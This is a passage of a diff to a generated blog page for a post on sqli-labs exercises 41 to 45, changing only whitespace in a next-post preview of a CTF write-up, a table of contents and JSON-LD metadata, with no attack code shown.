         <a class='next' href='/2023/03/28/buuctf-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun/'>
           <p class='title'>buuctf[极客大挑战2019]Havefun<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'># buuctf [极客大挑战 2019] Havefun
+          <p class='content'>buuctf[极客大挑战2019]Havefun
 
 进入页面
 
 无可用信息，查看源代码
 
 在下方被注释掉的一行中
-第 409 行说明这里使用 cat 变量接受参数
-if 语句中将 ca...</p>
+第409行说明这里使用cat变量接受参数
+if语句中将cat变量中的参数和’do...</p>
         </a>
       
     </div>
@@ -2857,7 +2859,7 @@ if 语句中将 ca...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-41"><span class="toc-text"> sqli-labs-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-42"><span class="toc-text"> sqli-labs-42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-43"><span class="toc-text"> sqli-labs-43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-44"><span class="toc-text"> sqli-labs-44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-45"><span class="toc-text"> sqli-labs-45</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-41"><span class="toc-text">sqli-labs-41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-42"><span class="toc-text">sqli-labs-42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-43"><span class="toc-text">sqli-labs-43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-44"><span class="toc-text">sqli-labs-44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqli-labs-45"><span class="toc-text">sqli-labs-45</span></a></li></ol>
     </div>
   </section>
 
@@ -3427,7 +3429,7 @@ if 语句中将 ca...</p>
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/","name":"sqli-labs-41-45"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-41-45","description":"# sqli-labs-41-45","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/","wordCount":17,"datePublished":"2023-03-29T08:15:31.000Z","dateModified":"2023-03-31T09:46:24.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","sameAs":["https://github.com/volantis-x"],"description":"这是我的专属博客"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://chenzhengkai10.github.io/","name":"Dr4x3zz"}},{"@type":"ListItem","position":2,"item":{"@id":"https://chenzhengkai10.github.io/categories/sqli-labs/","name":"sqli-labs"}},{"@type":"ListItem","position":3,"item":{"@id":"https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/","name":"sqli-labs-41-45"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","keywords":null,"description":"这是我的专属博客","author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/","description":"这是我的专属博客"},"publisher":{"@type":"Organization","name":"Dr4x3zz","url":"https://chenzhengkai10.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://chenzhengkai10.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"sqli-labs-41-45","description":"sqli-labs-41-45","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/"},"author":{"@type":"Person","name":"Dr4x3zz","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://chenzhengkai10.github.io/"},"publisher":{"@type":"Organization","name":"Dr4x3zz","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://chenzhengkai10.github.io/2023/03/29/sqli-labs-41-45/","wordCount":15,"datePublished":"2023-03-29T08:15:31.000Z","dateModified":"2023-03-31T09:46:24.000Z","articleSection":"sqli-labs","keywords":"sqli-labs","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
